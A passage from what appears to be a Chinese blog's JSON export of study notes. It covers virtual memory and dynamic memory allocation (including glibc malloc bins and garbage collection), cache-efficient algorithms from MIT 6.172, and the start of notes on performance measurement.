的共享区域。如果不仅仅是父子进程之间的跨进程通信的话，可以考虑使用 `shm_open` 来在虚拟文件系统里创建一个文件，然后通过 `mmap` 来共享内存。\r\n\r\n## 2. 内存分配\r\n\r\n`mmap` 可以实现内存分配，但是其在不同操作系统上可能不一样。并且内存映射是以页为单位的，不能细粒度分配。并且当需要释放内存的时候 `munmap` 需要给出 `length`，这也要求我们自己再维护 `mmap` 的长度。综上，我们需要动态内存分配器来进行内存分配。\r\n\r\n![image-20251002103013761](https://api.file.caiwen.work/picture/2025/10/02/image-20251002103013761.png)\r\n\r\n程序的内存布局如上，其中用户栈从高地址往低地址生长，堆从低地址往高地址生长。内核中维护了堆顶部的指针 `brk`。动态分配的内存会被放入堆中，堆是 zero fill on demand 的。\r\n\r\n### 2.1 显式分配器\r\n\r\n#### 2.1.1 相关函数\r\n\r\n`void *malloc(size_t size)` \r\n\r\n* 包含在 `stdlib.h` 中\r\n* 分配大小至少为 `size` 的内存块\r\n* 成功则返回内存块的地址，失败返回 `NULL` 并设置 `errno`\r\n* 由于这个内存块中会包含任何类型的数据，为了满足内存对齐的要求，在 32 位系统中返回地址是 8 的倍数（32 位系统上也能用 `double`），在 64 位系统中返回地址是 16 的倍数（64 位系统还要求对 SIMD 的类型有对齐支持）\r\n* `malloc` 并不会初始化分配的内存块。可以使用 `calloc`，这个函数是 `malloc` 的一个包装函数，来将分配的内存初始化为零\r\n\r\n`void *realloc(void *ptr, size_t new_size)`\r\n\r\n* 包含在 `stdlib.h` 中\r\n* 将原来分配的内存块的大小调整到 `new_size` \r\n* `ptr` 必须是 `malloc` 返回的内容，否则会出现 UB\r\n* 返回调整后的内存块的地址\r\n* 一般来说 `realloc` 会尝试直接把原来的内存块进行扩容，如果原内存块的后方还有未分配的区域。否则，将会分配一个新的大小为 `new_size` 的内存块并把原来的数据复制过去\r\n\r\n`void free(void *ptr)`\r\n\r\n* 包含在 `stdlib.h` 中\r\n* 将原来分配的内存块释放\r\n* `ptr` 必须是 `malloc` 返回的内容，否则会出现 UB\r\n\r\n`void *sbrk(intptr_t incr)`\r\n\r\n* 包含在 `unistd.h` 中\r\n* 将内核中的 `brk` 指针增加 `incr`，`incr` 既可以为正数或是负数\r\n* 如果成功，则返回 `brk` 指针的旧值，否则，返回 `-1` 并将 `errno` 设置为 `ENOMEM`\r\n* 一般是 `malloc` 内部来调用这个来自动扩容堆的\r\n\r\n#### 2.1.2 隐式空闲链表\r\n\r\n一个比较简单地实现内存分配器的方法是，我们在要分配出去的内存块的前面加一个头部，来记录一些信息：\r\n\r\n![image-20251002110009529](https://api.file.caiwen.work/picture/2025/10/02/image-20251002110009529.png)\r\n\r\n通过当前块位置和块大小就可以到达下一个块，这就相当于形成了一个隐式的链表。\r\n\r\n假如我们要求分配的内存块是 8 字节对齐的，那么块大小的低 3 位必然是 0，因此我们可以直接让低 3 存储一些额外的信息。这里就用来标识当前块是已分配还是空闲的。\r\n\r\n**放置策略**\r\n\r\n当我们请求一个 $k$ 字节的块时，分配器搜索空闲链表，此时有一些放置策略：\r\n\r\n* 首次适配：从头开始搜索空闲链表，如果找到一个合适的空闲块就会立刻分配\r\n  * 优点：倾向于把大的空闲块保留在后面\r\n  * 缺点：倾向于在前面留下碎片，增加了后续分配较大块的时间\r\n* 下一次适配：和首次适配类似，但是不是从头开始搜索，而是从上一次分配结束的地方开始\r\n  * 这个策略来源于这样的一个想法，如果我们上次在一个空闲块中成功适配的话，那么后面很有可能也在这个空闲块中成功适配\r\n  * 优点：比首次适配的运行速度快一点\r\n  * 缺点：内存利用率不如首次适配\r\n* 最佳适配：搜索整个空闲链表，找最合适的空闲块进行分配\r\n  * 优点：内存利用率更高\r\n  * 缺点：需要对空闲链表进行彻底的搜索，速度很慢\r\n\r\n**碎片**\r\n\r\n* 外部碎片：随着分配和释放的进行，已经被分配出去的块可能分布的比较乱，块中间的空闲区域变得又多又小，成为了外部碎片\r\n* 内部碎片：我们分配出去的块还需要携带一些额外信息，并且为了满足对齐要求，块会多分配一些大小进行填充。这些空间成为了内部碎片\r\n\r\n**合并策略**\r\n\r\n有可能有多个空闲块相邻，此时我们需要考虑一下合并的策略：\r\n\r\n* 立即合并：每当一个块被释放时，就会尝试和前后的空闲块进行合并\r\n* 推迟合并：等到某个稍晚的时候再合并。比如先不合并，直到某个分配请求失败之后再扫描整个堆进行合并（仅是例子，实际不会这么做）\r\n\r\n立即合并也会有一个问题，比如现在有一个大的空闲块，此时反复地合并和释放，会造成反复地合并和分割。因此一个快速的内存分配器会以某种方式推迟合并。\r\n\r\n由于合并的时候我们还需要知道前面的块的位置，所以我们可能还需要维护一个脚部，头部和脚部完全一致：\r\n\r\n![image-20251002114221647](https://api.file.caiwen.work/picture/2025/10/02/image-20251002114221647.png)\r\n\r\n不过这样还会造成空间的浪费。更聪明的做法是在在当前块的头部记录一下上一个块是不是空闲的，然后只在空闲块中加入脚部。\r\n\r\n#### 2.1.3 显式空闲链表\r\n\r\n和隐式空闲链表类似，但是空闲块还记录了前驱和后驱的数据：\r\n\r\n![image-20251002144832175](https://api.file.caiwen.work/picture/2025/10/02/image-20251002144832175.png)\r\n\r\n这样空闲链表里就只有空闲块了，搜索的时间下降。\r\n\r\n不过由于空闲块的额外信息，使得增大了最小块大小，增大了内部碎片的程度。\r\n\r\n#### 2.1.4 分离的空闲链表\r\n\r\n这里说明一下 glibc 的 malloc 实现。参考：[Understanding glibc malloc – sploitF-U-N](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)。\r\n\r\n首先是块的结构：\r\n\r\n![已分配的块](https://api.file.caiwen.work/picture/2025/10/02/image-20251002150156886.png)\r\n\r\n其中 `P` 表示前面的那个块是否被分配了。\r\n\r\n空闲块还记录了在同一个 binlist 中的前一个 chunk 和后一个 chunk 的指针。\r\n\r\n![空闲块](https://api.file.caiwen.work/picture/2025/10/02/image-20251002150528908.png)\r\n\r\n当我们要求 8 字节对齐之后，最小块大小为 16 字节。\r\n\r\nchunk 被放在 bin 中。bin 是一个空闲链表，有如下几个 bin：\r\n\r\n* fast bin\r\n  * 有 10 个 bin，第 1 个 bin 存放 16 字节的 chunk，第 2 个 bin 存放 24 字节的 chunk ... 以此类推。\r\n  * fast chunk 将不会和前后的空闲块合并。\r\n* unsorted bin\r\n  * 就一个 bin，可以存放任意大小的块。\r\n  * 一个块被释放之后，如果没有被加入到 fast bin 中的话就会被加入到 unsorted bin。加入到 unsorted bin 时不会和前后的空闲块进行合并。\r\n  * 所有块分割，分割出来的剩余部分都是放入 unsorted bin 中的。\r\n* small bin：\r\n  * 有 63 个 bin，第 1 个 bin 存放 16 字节的 chunk，第 2 个 bin 存放 24 字节的 chunk ... 以此类推，存放 16 到 512 字节。\r\n* large bin：\r\n  * 有 63 个 bin。其中有 32 个 bin 存放 64 字节的范围（如第一个 bin 存放大小为 513 到  576 字节的 chunk，第二个 bin 存放大小为 577 到 640 字节的 chunk...），有 16 个 bin 存放 512 字节的范围，有 8 个 bin 存放 4096 字节的范围，有 4 个 bin 存放 32768 字节的范围，有 2 个 bin 存放 262144 字节的范围，有 1 个 bin 存放剩余没有被覆盖的块大小。\r\n  * large bin 中可以存放不同大小的块。我们维持这个 bin 中的块按从大到小的顺序排列，即大的块在链表的头部，最小的块在链表的尾部。\r\n\r\n分配块的过程如下：\r\n\r\n* 如果请求的块大小在 fast chunk 的大小范围\r\n  * 从 fast bin 中查找是否有大小正好匹配的\r\n  * 没有的话则会触发 fast bin 块合并，合并后的块放入 unsorted bin 中\r\n* 再从 unsorted bin 中去遍历，当遍历到一个块，其大小小于请求的块大小时，会继续遍历下一个，并将这个块放入 small bin 或是 large bin 中。\r\n* 还是找不到的话则继续从 small bin / large bin 中寻找最佳适配（可以用 bitmap 来优化这一点）\r\n\r\n### 2.2 垃圾收集\r\n\r\n#### 2.2.1 Mark-And-Sweep\r\n\r\n将内存视为一个有向图，其中不可达的部分就是要清除的：\r\n\r\n![image-20251002164052207](https://api.file.caiwen.work/picture/2025/10/02/image-20251002164052207.png)\r\n\r\n其中的 Root 节点可以通过扫描栈和全局变量得到。\r\n\r\n我们可以在 C/C++ 中实现一个保守的 Mark & Swap 的垃圾收集器：\r\n\r\n![image-20251002164209169](https://api.file.caiwen.work/picture/2025/10/02/image-20251002164209169.png)\r\n\r\n之所以保守，是因为上述代码把一块内存中所有的数据都视为了指针。但实际上有可能出现只是单纯存储的内容有点像指针，而并非真的指针引用的情况。\r\n\r\n朴素的 Mark and Swap 需要暂停整个程序，等待 GC 结束之后再继续运行。Nettles-O'Toole Algorithm 是其渐进版本，原理大概是先让程序运行一段时间，然后暂停，推进 GC 执行（但不必完全执行完毕），程序和 GC 交替执行。但 Nettles-O'Toole Algorithm 需要引入一个 write barrier，每当将一个对象的引用写入到另一个对象的时候，将会触发 barrier，GC 会去检查这个对象是否已经被标记，没有被标记的话就会打上标记。\r\n\r\n#### 2.2.2 Stop-And-Copy\r\n\r\n和 Mark and Sweep 类似。但会使用一个 from space 和一个 to space，并使用 BFS 进行遍历，将可到达的内存块从 from space 复制到 to space，并更新指针引用，然后交换两个 space。\r\n\r\nStop and Copy 也有渐进的版本：Baker's Algorithm。和 Nettles-O'Toole Algorithm 不同的是其需要一个 read barrier，每当读取一个对象的时候，如果这个对象没有被复制到 to space，那么就复制过去。\n","summary":"虚拟内存将DRAM作为磁盘缓存，使用MMU和TLB进行地址翻译，处理缺页和内存映射。动态内存分配通过malloc等函数管理堆，采用隐式/显式链表和垃圾收集（如Mark-and-Sweep）优化碎片和回收。","key":["csapp-9","虚拟内存","MMU","缺页","内存映射","内存分配","垃圾收集","GC"],"tags":[],"path":["cs","csapp","CSAPP第九章 - 虚拟内存.md"],"background":"https://api.file.caiwen.work/picture/2025/10/07/20251007144241594.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-缓存高效算法","id":"mit6172-cache","createTime":"2025-09-28T00:59:00.000Z","updateTime":"2025-10-07T06:32:30.156Z","content":"\r\n\r\n\r\n## 1. Ideal-Cache Model\r\n\r\n### 1.1 Overview\r\n\r\n后续我们对缓存高效算法的分析就基于这样一个 Ideal-Cache Model 上：只有一个 cache set，缓存的 大小为 $M$，cache line 存储的块大小为 $B$，cache line 的数量总共是 $\\frac{M}{B}$。只有这一层缓存。并且我们假设如果出现了 capacity miss 的时候，我们永远能做出最优的替换选择（也就是假设我们知道后续的内存访问情况）。\r\n\r\n注意，由于我们这里只有一个 cache set，所以 ideal-cache model 并没有考虑 conflict miss 的情况，这和实际还是有差别的。\r\n\r\n![image-20250928091614831](https://api.file.caiwen.work/picture/2025/09/28/image-20250928091614831.png)\r\n\r\n然后我们有 **LRU Lemma**：假设一个程序在大小为 $M$ 的 ideal-cache 上发生了 $Q$ 次的缓存不命中，那么在一个大小为 $2M$ 全相连缓存（即只有一个 cache set）的缓存上，使用 LRU 的缓存替换策略，最多只会发生 $2Q$ 次的缓存不命中。这也就意味着在全相连缓存上，我们可以近似认为 LRU 就是最优策略。\r\n\r\n**Tall-cache assumption**：我们一律假设我们的缓存是比较高的，也就是 $\\frac{M}{B}>B$，也就是 $M>B^2$。这不仅符合现实情况，而且理论上也应该是这样。感性地理解为我们缓存肯定是少量多次地去覆盖工作集。考虑说如果我们有一个 short cache，那么可能一个 $n^2<M$ 的 submatrix 都无法放进缓存中。\r\n\r\n![image-20250928094949406](https://api.file.caiwen.work/picture/2025/09/28/image-20250928094949406.png)\r\n\r\n### 1.2 并行\r\n\r\n下面的分析基于使用 work stealing 的调度策略的。\r\n\r\n我们令 $Q_P$ 为在 $P$ 个核心上并行执行时**总共**产生的缓存不命中次数，$S_p$ 表示 work stealing 策略成功 steal 的次数。那么我们有：\r\n$$\r\nQ_P = Q_1 + O(\\frac{S_PM}{B})\r\n$$\r\n因为每次 steal 得来的任务最多需要 $\\frac{M}{B}$ 次缓存不命中使得该核上的缓存变为任务被 steal 前的缓存状态。\r\n\r\n我们之前分析过，$S_P$ 在期望上大概是 $O(PT_{\\infin})$ 的。\r\n\r\n这意味着，减少并行时的缓存不命中次数，就等同于减少顺序执行时的缓存不命中次数。  \r\n\r\n### 1.3 其他\r\n\r\n**Cache-Miss Lemma**：假设一个程序从内存中读取了 $r$ 段，第 $i$ 段包含 $s_i$ 字节。总读取量 $N=\\sum_{i=1}^r s_i$。程序使用的是总大小为 $M$，cache line 大小为 $B$ 的 ideal-cache。\r\n\r\n如果 $N < \\frac{M}{3}$ 且 $\\frac{N}{r} \\ge B$，那么我们说这 $r$ 段数据都能放进缓存中，且整个读取过程中产生的缓存不命中次数为 $\\frac{3N}{B}$。\r\n\r\n证明：直接顺序读取大小为 $s_i$ 的数据，产生的缓存不命中次数最多是 $\\frac{s_i}{B}+2$，如图：\r\n\r\n![image-20250928095054152](https://api.file.caiwen.work/picture/2025/09/28/image-20250928095054152.png)\r\n\r\n于是：\r\n$$\r\n\\begin{align}\r\n\\sum_{i=1}^r \\frac{s_i}{B}+2 \r\n&=\\frac{N}{B}+2r\\\\\r\n&=\\frac{N}{B}+\\frac{2rB}{B}\\\\\r\n&\\le \\frac{N}{B}+\\frac{2N}{B}\\\\\r\n&=\\frac{3N}{B}\r\n\\end{align}\r\n$$\r\n**Submatrix Caching Lemma**：如果一个 $n\\times n$ 的 submatrix 满足 $cM\\le n^2 < \\frac{M}{3}$（$c\\le 1$），那么对于这个 submatrix 是能够被放进 cache 里的，并且遍历一遍后缓存不命中次数最多是 $\\frac{3n^2}{B}$。应用 Cache-Miss Lemma 即可证明。\r\n\r\n\r\n\r\n## 2. 算法\r\n\r\n### 2.1 矩阵乘法\r\n\r\n#### 2.1.1 朴素算法\r\n\r\n![image-20250928101200588](https://api.file.caiwen.work/picture/2025/09/28/image-20250928101200588.png)\r\n\r\n访问情况：\r\n\r\n![image-20250928101228704](https://api.file.caiwen.work/picture/2025/09/28/image-20250928101228704.png)\r\n\r\n有如下几种情况：（注意下面的分析的前提是，matrix 都是**方**阵，cache 是**高**的）\r\n\r\n* $n>c\\frac{M}{B}$：由于 $B$ 的访问是沿着列的，且矩阵的一行放不到一个 cache line 中，并且整个缓存也放不下 $n$ 行，这就导致每访问一个元素就会带来一次缓存不命中。因此 $Q(n)=O(n^3)$ 。\r\n* $c'M^{\\frac{1}{2}}<n<c\\frac{M}{B}$：此时矩阵的一行仍放不到一个 cache line，但是整个缓存能放得下 $n$ 行，所以会呈现一定的空间局部性。$B$ 每全局访问一遍都会带来 $O(\\frac{n^2}{B})$ 个缓存不命中。我们会全局访问 $n$ 次 $B$，因此 $Q(n)=O(\\frac{n^3}{B})$。\r\n* $n<c'M^{\\frac{1}{2}}$：此时整个矩阵都能放入 cache 中，所以我们只需要承担 cold miss 即可，$Q(n)=O(\\frac{n^2}{B})$。\r\n\r\n#### 2.1.2 调整访问顺序\r\n\r\n如果我们交换一下循环：\r\n\r\n![image-20250928102517206](https://api.file.caiwen.work/picture/2025/09/28/image-20250928102517206.png)\r\n\r\n![image-20250928102615410](https://api.file.caiwen.work/picture/2025/09/28/image-20250928102615410.png)\r\n\r\n$B$ 的访问情况大概是按行访问，然后完整访问 $n$ 次 $B$，于是 $Q(n)=n\\cdot O(\\frac{n^2}{B})=O(\\frac{n^3}{B})$。\r\n\r\n#### 2.1.3 分块\r\n\r\n我们可以将矩阵分成若干个 $s\\times s$ 的小矩阵，然后进行运算。通过调整 $s\\times s$ 使得小矩阵能够放入缓存中，也就是我们尽可能满足 $s=O(M^{\\frac{1}{2}})$。\r\n\r\n![image-20250928104253505](https://api.file.caiwen.work/picture/2025/09/28/image-20250928104253505.png)\r\n\r\n![image-20250928104317126](https://api.file.caiwen.work/picture/2025/09/28/image-20250928104317126.png)\r\n\r\n然后一个小矩阵会带来 $O(\\frac{s^2}{B})$ 个缓存不命中。我们要进行 $O((\\frac{n}{s})^3)$ 次对小矩阵的操作，于是 $Q(n)=O(\\frac{n^3}{BM^{\\frac{1}{2}}})$。\r\n\r\n当然我们还可以对小矩阵再继续分块，使得能够利用二级缓存。以此类推，还能继续分块...\r\n\r\n这个方法有个很大的缺点，就是我们需要对分块大小进行调整。但是受到外部因素的影响，我们很难非常精准地调整好。\r\n\r\n#### 2.1.4 分治\r\n\r\n和分块差不多：\r\n\r\n![image-20250928105721115](https://api.file.caiwen.work/picture/2025/09/28/image-20250928105721115.png)\r\n\r\n![image-20250928105840470](https://api.file.caiwen.work/picture/2025/09/28/image-20250928105840470.png)\r\n\r\n缓存不命中次数：\r\n$$\r\nQ(n) = \r\n\\begin{cases}\r\nO(\\frac{n^2}{B}) & n^2 < cM, \\space n \\text{ 比较小，足以存放在缓存中} \\\\\r\n8Q(\\frac{n}{2}) + O(1) & \\text{ otherwise }\r\n\\end{cases}\r\n$$\r\n其中 otherwise 情况中的 $O(1)$ 是因为，我们调用函数进行分治的过程中可能会发生缓存不命中的情况，但是不命中次数是和数据规模无关的。\r\n\r\n我们使用 recursion tree 的方法来分析复杂度：\r\n\r\n![image-20250928110746049](https://api.file.caiwen.work/picture/2025/09/28/image-20250928110746049.png)\r\n\r\n我们的算法仅仅是不断地把问题的规模缩小，那么缩小到一定程度后就很容易吃到缓存了。这样做的话我们无需知道缓存的大小是多少，是否有多级缓存等，问题被缩小到一定程度之后自然就会利用好缓存了。我们将这种算法称为 cache-oblivious 算法。\r\n\r\n### 2.2 二维 DP\r\n\r\n#### 2.2.1 Cache oblivious\r\n\r\n比如现在有如下的 DP 转移方程：\r\n$$\r\ndp_{i,j}=f(dp_{i-1,j-1},dp_{i-1,j},dp_{i-1,j+1})\r\n$$\r\n我们令 $i\\le T,j\\le N$。\r\n\r\n如果直接朴素的去做的话，那么缓存不命中次数大概是 $Q(n)=O(\\frac{NT}{B})$。现在我们考虑将朴素算法转为缓存高效的算法。首先是我们可以划分出如图所示的一个梯形区域：\r\n\r\n![image-20250929085532696](https://api.file.caiwen.work/picture/2025/09/29/image-20250929085532696.png)\r\n\r\n这个梯形区域中，如果最底下的点已经被计算完成的话，那么剩余的其他点也都可以被计算出来，且不依赖于梯形区域以外的点。\r\n\r\n然后我们有如下两种的划分方案，如果这个梯形太“高”的话，或者说是 $\\text{width} < 2\\cdot \\text{height}$ ，那么我们可以直接从中间分开：\r\n\r\n![image-20250929085859454](https://api.file.caiwen.work/picture/2025/09/29/image-20250929085859454.png) \r\n\r\n如果这个梯形太“宽”，或者说是 $\\text{width} \\ge 2\\cdot \\text{height}$，那么我们就可以从中间用一条斜率为 $-1$ 的线去分成两半：\r\n\r\n![image-20250929090253246](https://api.file.caiwen.work/picture/2025/09/29/image-20250929090253246.png)\r\n\r\n当我们划分到区域高度为 1 的时候就到达 base case 了，不用再划分。\r\n\r\n总之我们就是不断地去划分这些区域，使得这些区域变得越来越小。这一部分我们类似上面的分治的方法来实现。同样地，当区域小到一定程度的时候整个区域都能被完整地放入缓存中，从而降低了 cache miss 数量。\r\n\r\n![image-20250929090648521](https://api.file.caiwen.work/picture/2025/09/29/image-20250929090648521.png)\r\n\r\n使用 recursion tree 来分析缓存不命中的复杂度：\r\n\r\n![image-20250929090823392](https://api.file.caiwen.work/picture/2025/09/29/image-20250929090823392.png)\r\n\r\n叶子节点大概是 $O(hw)$ 个点，其中由于我们划分方法的特性，$h=O(w)$。\r\n\r\n每个叶子节点大概会造成 $O(\\frac{w}{B})$ 个 misses（因为 base case 只有一层的点需要求），其中 $w=O(M)$，因为到叶子节点说明能被放入缓存中。\r\n\r\n叶子节点点数总和应为总点数，因此我们有 $O(\\frac{NT}{hw})$ 个叶子节点。\r\n\r\n内部节点也是 $O(\\frac{NT}{hw})$ 的，但每个内部节点只贡献 $O(1)$ 的缓存不命中，总起来不影响渐进复杂度。 \r\n\r\n于是 $Q(n)=O(\\frac{NT}{hw})\\cdot O(\\frac{w}{B})=O(\\frac{NT}{M^2})\\cdot O(\\frac{M}{B})=O(\\frac{NT}{MB})$。\r\n\r\n我们大幅度降低了缓存不命中次数，但是实际性能提升不明显。一个主要原因就是，我们这个问题的访问模式比较有规律，硬件可能会启用 prefetch 机制。不过我们这个算法又并非是朴素的做法，prefetch 会不准确，导致性能下降。\r\n\r\n#### 2.2.2 并行\r\n\r\n上述算法并不能直接用于并行，因为划分出来的两个部分存在依赖关系。为了使用并行优化，我们可以像下面这样多划分一部分：\r\n\r\n![image-20250929093912876](https://api.file.caiwen.work/picture/2025/09/29/image-20250929093912876.png)\r\n\r\n![image-20250929093931406](https://api.file.caiwen.work/picture/2025/09/29/image-20250929093931406.png)\r\n\r\n同色部分可以并行执行。\r\n\r\n### 2.3 归并排序\r\n\r\n朴素归并排序的缓存不命中情况：\r\n$$\r\nQ(n) = \r\n\\begin{cases}\r\nO(\\frac{n}{B}) & \\text{ if } n\\le cM \\text{ , constant } c \\le 1 \\\\\r\n2Q(\\frac{n}{2})+O(\\frac{n}{B}) & \\text{ otherwise } \r\n\\end{cases}\r\n$$\r\n![缓存不命中复杂度分析](https://api.file.caiwen.work/picture/2025/10/02/image-20251002212227858.png)\r\n\r\ncache oblivious 的思路是，我们不再分成两部分再合并，而是分成 $R$ 部分合并。\r\n\r\n![R路归并排序](https://api.file.caiwen.work/picture/2025/10/02/image-20251002212733618.png)\r\n\r\n每个元素要经过 $\\log n$ 层来输出，所以合并的时间复杂度是 $O(n\\log n)$ 的，于是我们有：\r\n$$\r\nW(n) = \r\n\\begin{cases}\r\nO(1) &\\text{ if } n = 1 \\\\\r\nRW(\\frac{n}{R}) + O(n\\log R) &\\text{ otherwise }\r\n\\end{cases}\r\n$$\r\n![总时间复杂度分析](https://api.file.caiwen.work/picture/2025/10/02/image-20251002213010900.png)\r\n\r\n然后我们考虑一下缓存不命中次数。当 $n<cM$ 时，如果取 $R=\\frac{cM}{B}$ ，那么数据能够放入缓存中。于是我们有：\r\n$$\r\nQ(n) = \r\n\\begin{cases}\r\nO(\\frac{n}{B}) & \\text{ if } n < cM \\\\\r\nR\\cdot Q(\\frac{n}{R}) + O(\\frac{n}{B}) & \\text{ otherwise }\r\n\\end{cases}\r\n$$\r\n![缓存不命中复杂度分析](https://api.file.caiwen.work/picture/2025/10/02/image-20251002213428704.png)\r\n\r\n一般我们有 $n\\gg M$，于是：$O(\\log \\frac{n}{M}) = O(\\log n)$。\r\n$$\r\n\\begin{align}\r\nQ_{\\text{multiway}}(n) \r\n&= O(\\frac{n}{B}\\log_R\\frac{n}{M}) \\\\\r\n&= O(\\frac{n}{B}\\log_{\\frac{M}{B}}\\frac{n}{M}) \\\\\r\n&= O(\\frac{n}{B}\\log_M\\frac{n}{M}) \\\\\r\n&= O(\\frac{n\\log \\frac{n}{M}}{B\\log M}) \\\\\r\n&= O(\\frac{n\\log n}{B\\log M})\r\n\\end{align}\r\n$$\r\n对比一下之前的：\r\n$$\r\n\\begin{align}\r\nQ_{\\text{binary}}(n)\r\n&= O(\\frac{n}{B}\\log \\frac{n}{M}) \\\\\r\n&= O(\\frac{n\\log n}{B})\r\n\\end{align}\r\n$$\r\n相当于减少了 $\\log M$ 倍。当 L1-cache 大小为 $2^{15}$ 时，大概能有 $15$ 倍的加速。\r\n\r\n### 2.4 BFS\r\n\r\n在一个 CSR 形式的图上进行 BFS：\r\n\r\n![image-20251007130024981](https://api.file.caiwen.work/picture/2025/10/07/image-20251007130024981.png)\r\n\r\n其中箭头指向的那一行是最耗时的代码，因为对于每一条边，都会尝试判断其连向的点是否已经遍历过，这会带来 $m$ 次的随机访问，使得缓存基本上发挥不了什么作用。\r\n\r\n一个优化方法是，我们开一个 bitset 来记录某个点是否遍历过。这样如果有 $n$ 个点，则只需要 $n$ 个位来存储。这样的 bitset 大小会比较小，容易放入到缓存中：\r\n\r\n![image-20251007130717314](https://api.file.caiwen.work/picture/2025/10/07/image-20251007130717314.png)\r\n\r\n\n","summary":"本文介绍了理想缓存模型及其在算法优化中的应用，包括矩阵乘法、二维动态规划、归并排序和广度优先搜索的缓存高效实现，旨在减少缓存不命中次数，提升性能。","key":["mit6.172","软件性能工程","优化","缓存","算法"],"tags":[],"path":["cs","软件性能工程","软件性能工程-缓存高效算法.md"],"background":"https://api.file.caiwen.work/picture/2025/09/29/image-20250929090823392.png","recommend":false,"status":"published"},{"type":"Article","title":"软件性能工程-性能测量","id":"mit6172-5","createTime":"2025-09-23T09:20:00.000Z","updateTime":"2025-09-23T09:22:13.041Z","content":"\r\n\r\n\r\n## 1. Unquiesced System\r\n\r\n为了保证测量的准确，我们需要尽可能排除其他因素的干扰，一般我们需要注意如下的几点：\r\n\r\n* 确保没有其他的进程在运行，关闭后台进程和定时任务。\r\n* 断开网络，甚至不要碰鼠标：因为这些外界影响会引起操作系统的中断。\r\n\r\n* 被测量的程序最好不要在 CPU 第 0 个核上运行：因为第 0 个核通常会用于处理中断。\r\n* 不要打开超线程：超线程技术可以将一个核心虚拟化成两个核心，而在软件层面上感知不到。而虚拟化出来的两个核心性能并非等同于真正的两个核心，这会给我们的测量带来麻烦。\r\n* 关闭 DVFS：DVFS 使得当 CPU 过热时自动降低频率来控制温度。\r\n* 关闭 Turbo Boost：Turbo Boost 使得，如果 CPU 其他核心负载较小，只有一个核心在执行较多任务时，提高该核心的频率。\r\n* 使用 `taskset` 这个工具，来把指定进程绑定到 CPU 的某个核心上。\r\n\r\n除此以外，我们的程序最好是满足对齐要求的（编译器应该已经解决了这点）。不然的话，可能我们的程序进行细微改动之后，被改动地方的后面的位置都向前或是向后平移，有些数据原来可能只需要从内存中读一次就能读完，现在需要读两次才能读完，影响了性能。\r\n\r\n有意思的是可能可执行文件的名称的长度也会影响性能。因为操作系统加载可执行文件之后，会在栈上加入命令行参数，第一个参数就是可执行文件的名称。名称长度发生变化就会使得栈上后续内存的对齐出现问题。\r\n\r\n还有更玄学的。DRAM 是容易受到外部环境干扰，使得存储的位发生翻转的。但计算机有一些机制来进行纠错，而纠错的过程就会带来一些时间上的影响。\r\n\r\n## 2. 性能测量\r\n\r\n### 2.1 外部测量\r\n\r\n#### 2.1.1 time\r\n\r\n我们可以直接使用 `/usr/bin/time` 进行测量。该测量程序运行完毕后会给出三个时间：\r\n\r\n* real：程序在现实世界中的运行时间\r\n* user：程序在用户态运行的时间\r\n* sys：程序在内核态运行的时间（一般是由于系统调用产生的）\r\n\r\n一般 real time 约等于 user time + sys time。\r\n\r\n但是有可能出现 IO 等待、线程堵塞（如等待锁）、操作系统调度的开销等因素，使得 real time 偏大。\r\n\r\n由于 sys time 和 user time 是会在多核上累积的，所以如果程序是多核并行的话，real time 又会偏小。\r\n\r\n### 2.2 内部测量\r\n\r\n#### 2.2.1 rdtsc\r\n\r\nX86 处理器提供一个 time-stamp counter (TSC)。存储的是 CPU 自通电以来经过的周期数量。我们可以用如下的代码进行读取：\r\n\r\n![image-20250923163046095](https://api.file.caiwen.work/picture/2025/09/23/image-20250923163046095.png)\r\n\r\n不过一般不建议使用该方法，因为其有如下的缺点：\r\n\r\n* 每个核心上的 tsc 不同（每个核心的频率不一样）\r\n* tsc 并不是以一个恒定速度增长的（同一个核心的频率也可能发生变化）\r\n* tsc 不是单调递增的，可能发生溢出又从 0 开始\r\n* 很难把时钟周期转化为具体的秒数\r\n\r\n#### 2.2.2 gettimeofday\r\n\r\n`gettimeofday()` 也不建议使用。计算机内部会存储并更新一个时间，但一般会有偏差，使得与现实世界的时间的差距越来越大。而操作系统又会定期联网同步时间，当时间同步的时候可能会使得系统的时间发生变化（应该不是突然改变，而是加速向真实时间靠近）。而 `gettimeofday` 就依赖于系统的时间，因此并不可靠。\r\n\r\n#### 2.2.3 clock_gettime\r\n\r\n最推荐使用的是 `clock_time(CLOCK_MONOTONIC, ...)` 。\r\n\r\n![image-20250923165151441](https://api.file.caiwen.work/picture/2025/09/23/image-20250923165151441.png)\r\n\r\n`CLOCK_MONOTONIC` 参数可以确保得到的时间一定是单调递增的，不会像 `rdtsc` 一样由于溢出而回滚，或是 `gettimeofday` 一样受系统时间同步的影响。\r\n\r\n并且 `clock_gettime` 貌似在系统层面有优化，要比普通的系统调用快一点。\r\n\r\n### 2.3 采样\r\n\r\n如果我们想知道程序中哪个函数运行的最慢，我们可以用这样的方法进行粗略的测量：使用 `gdb` 运行程序，然后固定间隔按一下 Ctrl+C ，就知道当前正在运行的函数。通过多次采样就知道程序中哪个函数所占时间最长了。\r\n\r\n`pmprof` 和 `gprof` 就是这个原理，并且他们已经把这个过程自动化了，不需要再手动操作。\r\n\r\n### 2.4 时间计数\r\n\r\nCPU 中有一个可编程的 PMU，可以对指定事件进行计数（如缓存未命中，分支预测错误等）。当我们需要统计某个事件的时候，可以向 PMU 注册这个事件。后续当这个事件发生之后，PMU 就会将对应的计数器加一。\r\n\r\n`libpfm4` 提供了对应的接口。`perf stat` 就是利用 `libpfm4` 实现的。\r\n\r\n值得注意的是，PMU 内的计数器是有限的（大概是 4 到 5 个的样子）。考虑到可能同时有多个进程有对多个事件进行统计的要求，操作系统会采用类似分时复用的机制将 PMU 进行虚拟化。比建议同时测量超过 4 到 5 个事件，因为这样会降低准确性和性能。\r\n\r\n### 2.5 模拟器\r\n\r\n我们可以使用模拟器来精准且可复现地测量程序性能，如 `cachegrind` 